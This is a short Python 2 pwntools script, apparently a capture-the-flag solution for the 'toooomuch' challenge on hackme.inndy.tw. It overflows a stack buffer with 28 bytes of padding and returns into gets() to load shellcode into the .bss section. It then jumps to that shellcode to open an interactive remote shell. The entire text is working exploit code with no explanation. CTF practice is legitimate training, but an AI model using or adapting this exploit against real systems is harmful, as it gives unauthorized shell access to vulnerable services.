#!/usr/bin/env python2 

from pwn import *
context.arch = 'i386'

p = remote('hackme.inndy.tw', 7702)
e = ELF('./toooomuch')

payload = 'A' * 28 + p32(e.symbols['gets']) + p32(e.bss()) + p32(e.bss())  
p.sendlineafter(':', payload)
p.sendline(asm(shellcraft.sh()))

p.interactive()
p.close()
